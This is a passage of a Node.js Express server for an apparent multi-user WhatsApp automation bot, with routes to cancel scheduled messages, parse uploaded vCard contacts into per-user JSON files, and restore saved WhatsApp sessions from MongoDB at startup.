        fs.writeFileSync(getUserPaths(userId).scheduleFile, JSON.stringify(session.scheduledMessages, null, 2));
        res.json({ status: 'Scheduled message cancelled!' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to cancel schedule: ' + err.message });
    }
});

app.post('/api/upload-vcf', (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    try {
        const { vcfData } = req.body;
        if (!vcfData) throw new Error('VCF data missing.');
        const cards = vcfData.split(/BEGIN:VCARD/i);
        let count = 0;
        session.contactsMap.clear();

        for (let card of cards) {
            if (!card.includes('END:VCARD')) continue;
            const lines = card.split(/\r\n|\n/);
            let currentName = "";
            let phoneNumbers = [];
            for (let line of lines) {
                line = line.trim();
                if (line.startsWith('FN:')) currentName = line.substring(3).trim();
                else if (line.startsWith('TEL')) {
                    const telMatch = line.match(/:([\+\d\s\-\(\)]+)/);
                    if (telMatch && telMatch[1]) phoneNumbers.push(telMatch[1]);
                }
            }
            if (!currentName) currentName = "Unknown Contact";
            for (let phone of phoneNumbers) {
                const contactObj = formatJidAndName(phone, currentName);
                if (contactObj && !session.contactsMap.has(contactObj.id)) {
                    session.contactsMap.set(contactObj.id, { id: contactObj.id, name: currentName });
                    count++;
                }
            }
        }
        fs.writeFileSync(getUserPaths(userId).dbFile, JSON.stringify(Array.from(session.contactsMap.values()), null, 2));
        res.json({ status: `Successfully parsed and added ${count} clean contacts!` });
    } catch (err) {
        res.status(500).json({ status: 'Failed to process VCF file: ' + err.message });
    }
});

// --- AUTO-RESTORE SESSIONS FROM MONGODB ON STARTUP ---
async function autoRestoreSessions() {
    try {
        if (!sessionsCollection) {
            setTimeout(autoRestoreSessions, 2000);
            return;
        }
        const allSessions = await sessionsCollection.find({}).toArray();
        if (allSessions.length > 0) {
            for (const doc of allSessions) {
                const userId = doc.userId;
                console.log(`🔄 [Auto-Restore] Restoring WhatsApp session from MongoDB for user: ${userId}`);
                getUserSessionState(userId);
                startUserBot(userId);
            }
        }
    } catch (err) {
        console.error('[Auto-Restore MongoDB Error]:', err.message);
    }
}

// Run server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`🚀 Nexon Multi-User Automation Grid running on port ${PORT}`);
    setTimeout(autoRestoreSessions, 2000);
});